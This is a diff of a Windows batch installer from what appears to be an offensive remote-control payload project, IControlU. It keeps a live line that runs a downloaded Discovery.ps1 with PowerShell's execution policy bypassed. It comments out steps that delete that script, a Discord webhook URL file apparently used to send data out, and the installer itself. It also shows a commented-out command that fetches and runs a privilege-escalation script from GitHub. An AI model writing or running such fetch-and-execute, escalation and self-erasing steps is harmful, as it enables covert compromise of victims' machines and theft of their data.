@@ -20,15 +20,15 @@ powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IContr
 @echo Executing
 powerShell -ExecutionPolicy Bypass -File "Discovery.ps1"
 
-@REM Delete the discovery file
-del "Discovery.ps1"
+@REM @REM Delete the discovery file
+@REM del "Discovery.ps1"
 
-@REM Delete the Discord Webhook file
-del "DiscordWebhookURL.icu"
+@REM @REM Delete the Discord Webhook file
+@REM del "DiscordWebhookURL.icu"
 
-@REM powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
-@REM powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"
+@REM @REM powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/f49099d8d113b227d42a031886fca74aba4cf772/Payload/PrivilegeEscalation.cmd' -OutFile 'PrivilegeEscalation.cmd'"
+@REM @REM powershell -ExecutionPolicy RemoteSigned -File "PrivilegeEscalation.cmd"
 
-@REM Delete the original installer
-cd /d %CurrentDirectory%
-del "Installer.cmd"
+@REM @REM Delete the original installer
+@REM cd /d %CurrentDirectory%
+@REM del "Installer.cmd"
